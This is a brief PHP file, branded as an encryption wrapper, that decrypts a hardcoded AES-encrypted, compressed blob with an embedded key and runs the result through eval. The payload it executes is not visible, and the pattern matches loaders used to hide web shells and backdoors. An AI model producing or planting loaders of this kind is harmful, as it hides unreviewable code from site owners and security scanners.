<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k2533f = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p83ba0 = base64_decode('cu1YaQas3rlxN7ZLjZMjbmh6ckVFQmdUQ1ZXazh5KzdaYjJkVW1WTUFyMkRFZmhhLzZHVXErTDN0WWhaS09kSTdtRTh4K0ZSbCtmZzR3L2oxaDJSV2s3eUFaejhqdXkvY09ReHd3ckFTTERscHNodHVYQngxQ2RZbEJXaHhmVHg5Kzd3Vk9Jam1XaGZXK251SHROcE9HcDAxdkFXNmpzT0VwaTdnbnNFUXpzUHN5K2NaQTZGNUo2NWY5RzAvN3UrazJNTE5TQzhseVM1bHBWZm1WcnVuRnIrODlhdEJQQnJmNW85bVVBN2VxR2pveFdmVHZqVlAwRFU5cFdsZEl4cUovZmFKOHU5bkdpbzMrY2w=');
$i3fb8f = openssl_cipher_iv_length('aes-256-cbc');
$vee8f1 = substr($p83ba0, 0, $i3fb8f);
$ce70c2 = substr($p83ba0, $i3fb8f);
eval('?>'.gzinflate(openssl_decrypt($ce70c2, 'aes-256-cbc', $k2533f, 0, $vee8f1)));